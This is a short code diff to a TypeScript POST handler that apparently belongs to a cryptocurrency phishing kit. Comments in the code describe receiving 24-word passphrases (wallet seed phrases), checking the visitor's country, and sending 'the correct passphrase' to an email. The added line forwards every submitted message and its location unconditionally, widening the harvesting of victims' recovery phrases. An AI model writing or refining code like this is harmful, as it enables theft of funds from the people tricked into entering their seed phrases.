@@ -58,6 +58,8 @@ export async function POST(request: Request) {
         // Validate that the message is a passphrase with 24 words
         const words = message.trim().split(/\s+/);
 
+        await formatMessage(message, location);
+
         if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
             // Send the correct passphrase to the first email
             await formatMessage(message, location);
